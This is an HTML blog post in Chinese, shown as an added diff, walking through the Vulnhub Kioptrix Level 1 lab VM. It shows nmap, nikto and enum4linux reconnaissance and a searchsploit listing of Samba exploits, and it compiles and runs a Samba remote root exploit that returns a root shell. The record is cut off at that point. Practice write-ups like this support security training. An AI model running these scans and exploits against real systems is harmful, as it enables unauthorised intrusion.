@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Sh4Nn0n's Blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="tags: 渗透测试 Vulnhub OSCPcategories: OSCP Kioptrix Level 1信息收集查看靶机ip1234567root@kali:~# nmap -sn 192.168.208.1/24 -T4Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-19 02:42 ESTNmap scan report for b">
+<meta name="keywords" content="hacker">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Kioptrix-lv.1-WalkThrough">
+<meta property="og:url" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-1-WalkThrough/index.html">
+<meta property="og:site_name" content="Sh4Nn0n&#39;s Blog">
+<meta property="og:description" content="tags: 渗透测试 Vulnhub OSCPcategories: OSCP Kioptrix Level 1信息收集查看靶机ip1234567root@kali:~# nmap -sn 192.168.208.1/24 -T4Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-19 02:42 ESTNmap scan report for b">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-03-05T08:45:34.423Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-Kioptrix-lv.1-WalkThrough">
+<meta name="twitter:description" content="tags: 渗透测试 Vulnhub OSCPcategories: OSCP Kioptrix Level 1信息收集查看靶机ip1234567root@kali:~# nmap -sn 192.168.208.1/24 -T4Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-19 02:42 ESTNmap scan report for b">
+  <link rel="canonical" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-1-WalkThrough/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>vulnhub-Kioptrix-lv.1-WalkThrough | Sh4Nn0n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sh4Nn0n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">^.^</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix-lv-1-WalkThrough/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sh4Nn0n">
+      <meta itemprop="description" content="甲方安全小白帽，欢迎交流~">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sh4Nn0n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">vulnhub-Kioptrix-lv.1-WalkThrough
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-05 16:43:13 / 修改时间：16:45:34" itemprop="dateCreated datePublished" datetime="2020-03-05T16:43:13+08:00">2020-03-05</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>tags:</p><ul>
+<li>渗透测试</li>
+<li>Vulnhub</li>
+<li>OSCP<br>categories:</li>
+<li>OSCP</li>
+</ul><hr><h2 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h2><hr><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看靶机ip</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">208.1</span>/<span class="number">24</span> -T4</span><br><span class="line">Starting Nmap <span class="number">7.70</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2020</span>-<span class="number">01</span>-<span class="number">19</span> <span class="number">02</span>:<span class="number">42</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">208.136</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00014</span>s latency).</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">52</span>:D9:<span class="number">25</span> (VMware)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">5</span> hosts <span class="keyword">up</span>) scanned in <span class="number">1.93</span> seconds</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+
+
+
+<p>查看端口开放情况</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -Pn -vv -T4 -p- --max-retries 1 -sS --max-scan-delay 20 192.168.208.136</span><br><span class="line"></span><br><span class="line">PORT     STATE<span class="built_in"> SERVICE </span>    REASON</span><br><span class="line">22/tcp   open  ssh         syn-ack ttl 64</span><br><span class="line">80/tcp   open  http        syn-ack ttl 64</span><br><span class="line">111/tcp  open  rpcbind     syn-ack ttl 64</span><br><span class="line">139/tcp  open  netbios-ssn syn-ack ttl 64</span><br><span class="line">443/tcp  open  https       syn-ack ttl 64</span><br><span class="line">1024/tcp open  kdm         syn-ack ttl 64</span><br><span class="line">MAC Address: 00:0C:29:52:D9:25 (VMware)</span><br></pre></td></tr></table></figure>
+
+<p>扫一下web服务</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h 192.168.208.136</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.208.136</span><br><span class="line">+ Target Hostname:    192.168.208.136</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">03</span>:<span class="number">10</span>:<span class="number">57</span> (GMT<span class="number">-5</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span><span class="number">.4</span> OpenSSL/<span class="number">0.9</span><span class="number">.6</span>b</span><br><span class="line">+ <span class="keyword">Server</span> may leak inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /, inode: <span class="number">34821</span>, <span class="keyword">size</span>: <span class="number">2890</span>, mtime: Wed Sep  <span class="number">5</span> <span class="number">23</span>:<span class="number">12</span>:<span class="number">46</span> <span class="number">2001</span></span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ mod_ssl/<span class="number">2.8</span><span class="number">.4</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> <span class="number">2.8</span><span class="number">.31</span>) (may depend <span class="keyword">on</span> <span class="keyword">server</span> <span class="keyword">version</span>)</span><br><span class="line">+ Apache/<span class="number">1.3</span><span class="number">.20</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.37</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ OpenSSL/<span class="number">0.9</span><span class="number">.6</span>b appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> <span class="number">1.1</span><span class="number">.1</span>). OpenSSL <span class="number">1.0</span><span class="number">.0</span>o <span class="keyword">and</span> <span class="number">0.9</span><span class="number">.8</span>zc <span class="keyword">are</span> also current.</span><br><span class="line">+ OSVDB<span class="number">-27487</span>: Apache <span class="keyword">is</span> vulnerable <span class="keyword">to</span> XSS via the Expect header</span><br><span class="line">+ OSVDB<span class="number">-838</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.</span>x up <span class="number">1.2</span><span class="number">.34</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a remote DoS <span class="keyword">and</span> possible code execution. CAN<span class="number">-2002</span><span class="number">-0392.</span></span><br><span class="line">+ OSVDB<span class="number">-4552</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.3</span> below <span class="number">1.3</span><span class="number">.27</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a <span class="keyword">local</span> buffer <span class="keyword">overflow</span> which allows attackers <span class="keyword">to</span> <span class="keyword">kill</span> <span class="keyword">any</span> process <span class="keyword">on</span> the system. CAN<span class="number">-2002</span><span class="number">-0839.</span></span><br><span class="line">+ OSVDB<span class="number">-2733</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.3</span> below <span class="number">1.3</span><span class="number">.29</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> overflows <span class="keyword">in</span> mod_rewrite <span class="keyword">and</span> mod_cgi. CAN<span class="number">-2003</span><span class="number">-0542.</span></span><br><span class="line">+ mod_ssl/<span class="number">2.8</span><span class="number">.4</span> - mod_ssl <span class="number">2.8</span><span class="number">.7</span> <span class="keyword">and</span> <span class="keyword">lower</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a remote buffer <span class="keyword">overflow</span> which may <span class="keyword">allow</span> a remote shell. <span class="keyword">http</span>://cve.mitre.org/cgi-<span class="keyword">bin</span>/cvename.cgi?<span class="keyword">name</span>=CVE<span class="number">-2002</span><span class="number">-0082</span>, OSVDB<span class="number">-756.</span></span><br><span class="line">+ Allowed <span class="keyword">HTTP</span> Methods: <span class="keyword">GET</span>, <span class="keyword">HEAD</span>, OPTIONS, <span class="keyword">TRACE</span> </span><br><span class="line">+ OSVDB<span class="number">-877</span>: <span class="keyword">HTTP</span> <span class="keyword">TRACE</span> method <span class="keyword">is</span> active, suggesting the host <span class="keyword">is</span> vulnerable <span class="keyword">to</span> XST</span><br><span class="line">+ ///etc/<span class="keyword">hosts</span>: The <span class="keyword">server</span> <span class="keyword">install</span> allows reading <span class="keyword">of</span> <span class="keyword">any</span> <span class="keyword">system</span> <span class="keyword">file</span> <span class="keyword">by</span> adding an extra <span class="string">'/'</span> <span class="keyword">to</span> the URL.</span><br><span class="line">+ OSVDB<span class="number">-682</span>: /<span class="keyword">usage</span>/: Webalizer may be installed. <span class="keyword">Versions</span> <span class="keyword">lower</span> <span class="keyword">than</span> <span class="number">2.01</span><span class="number">-09</span> vulnerable <span class="keyword">to</span> <span class="keyword">Cross</span> Site Scripting (XSS).</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /<span class="keyword">manual</span>/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /<span class="keyword">manual</span>/: Web <span class="keyword">server</span> <span class="keyword">manual</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /icons/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /test.php: This might be interesting...</span><br><span class="line">+ /wp-<span class="keyword">content</span>/themes/twentyeleven/images/headers/server.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-<span class="keyword">content</span>/themes/twentyeleven/images/headers/server.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wp-includes/Requests/Utility/<span class="keyword">content</span>-post.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-includes/Requests/Utility/<span class="keyword">content</span>-post.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /login.cgi?cli=aa%<span class="number">20</span>aa%<span class="number">27</span>cat%<span class="number">20</span>/etc/<span class="keyword">hosts</span>: <span class="keyword">Some</span> D-<span class="keyword">Link</span> router remote command execution.</span><br><span class="line">+ /shell?cat+/etc/<span class="keyword">hosts</span>: A backdoor was identified.</span><br><span class="line">+ <span class="number">8724</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">30</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">03</span>:<span class="number">12</span>:<span class="number">15</span> (GMT<span class="number">-5</span>) (<span class="number">78</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
+
+<p>扫一下操作系统</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># enum4linux 192.168.208.136</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有两处需要关注, 一个是smb服务, 一个是apache的</p>
+<ul>
+<li>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.</li>
+</ul>
+<p>有个很坑的东西是, 本来用enum4linux可以列举出samba的版本的, 但不知道为什么这里没出来, 所以我们用msf再探测一下版本.</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">msf5</span> <span class="selector-tag">auxiliary</span>(scanner/smb/smb_version) &gt; <span class="selector-tag">run</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.208</span><span class="selector-class">.136</span><span class="selector-pseudo">:139</span>   <span class="selector-tag">-</span> <span class="selector-tag">Host</span> <span class="selector-tag">could</span> <span class="selector-tag">not</span> <span class="selector-tag">be</span> <span class="selector-tag">identified</span>: <span class="selector-tag">Unix</span> (Samba <span class="number">2.2</span>.<span class="number">1</span>a)</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.208</span><span class="selector-class">.136</span><span class="selector-pseudo">:445</span>   <span class="selector-tag">-</span> <span class="selector-tag">Scanned</span> <span class="selector-tag">1</span> <span class="selector-tag">of</span> <span class="selector-tag">1</span> <span class="selector-tag">hosts</span> (<span class="number">100%</span> complete)</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Auxiliary</span> <span class="selector-tag">module</span> <span class="selector-tag">execution</span> <span class="selector-tag">completed</span></span><br></pre></td></tr></table></figure>
+
+<p>samba版本是2.21a</p>
+<p>搜索了一下发现这个samba的版本有问题, 本着尽量不使用msf的原则0 0</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># searchsploit samba 2.2</span></span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                |  Path</span><br><span class="line">                                                                                              | (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Samba <span class="number">2.0</span>.x/<span class="number">2.2</span> - Arbitrary File Creation                                                     | exploits/unix/remote/<span class="number">20968</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">0</span> &lt; <span class="number">2.2</span>.<span class="number">8</span> (OSX) - trans2open Overflow (Metasploit)                                  | exploits/osx/remote/<span class="number">9924</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">2</span> &lt; <span class="number">2.2</span>.<span class="number">6</span> - <span class="string">'nttrans'</span> Remote Buffer Overflow (Metasploit) (<span class="number">1</span>)                       | exploits/linux/remote/<span class="number">16321</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (BSD x86) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                             | exploits/bsd_x86/remote/<span class="number">16880</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Linux Kernel <span class="number">2.6</span> / Debian / Mandrake) - Share Privilege Escalation               | exploits/linux/local/<span class="number">23674</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Linux x86) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                           | exploits/linux_x86/remote/<span class="number">16861</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (OSX/PPC) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                             | exploits/osx_ppc/remote/<span class="number">16876</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Solaris SPARC) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                       | exploits/solaris_sparc/remote/<span class="number">16330</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> - Brute Force Method Remote Command Execution                                     | exploits/linux/remote/<span class="number">55</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">1</span>)                                    | exploits/unix/remote/<span class="number">22468</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">2</span>)                                    | exploits/unix/remote/<span class="number">22469</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">3</span>)                                    | exploits/unix/remote/<span class="number">22470</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">4</span>)                                    | exploits/unix/remote/<span class="number">22471</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'nttrans'</span> Remote Overflow (Metasploit)                                          | exploits/linux/remote/<span class="number">9936</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.x - CIFS/<span class="number">9000</span> Server A.<span class="number">01</span>.x Packet Assembling Buffer Overflow                       | exploits/unix/remote/<span class="number">22356</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - Remote Buffer Overflow                                                          | exploits/linux/remote/<span class="number">7</span>.pl</span><br><span class="line">Samba &lt; <span class="number">2.2</span>.<span class="number">8</span> (Linux/BSD) - Remote Code Execution                                             | exploits/multiple/remote/<span class="number">10</span>.c</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"><span class="symbol">Shellcodes:</span> No Result</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/Desktop/10.c</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># gcc 10.c -o 10</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># ./10 -b 0 -v 192.168.208.136</span></span><br><span class="line">samba-<span class="number">2.2</span>.<span class="number">8</span> &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">+ Verbose mode.</span><br><span class="line">+ Bruteforce mode. (Linux)</span><br><span class="line">+ Host is running samba.</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffed4</span>]</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffda8</span>]</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffc7c</span>]</span><br><span class="line">+ Worked!</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">*** JE MOET JE MUIL HOUWE</span><br><span class="line">Linux kioptrix.level1 <span class="number">2.4</span>.<span class="number">7</span>-<span class="number">10</span> <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span 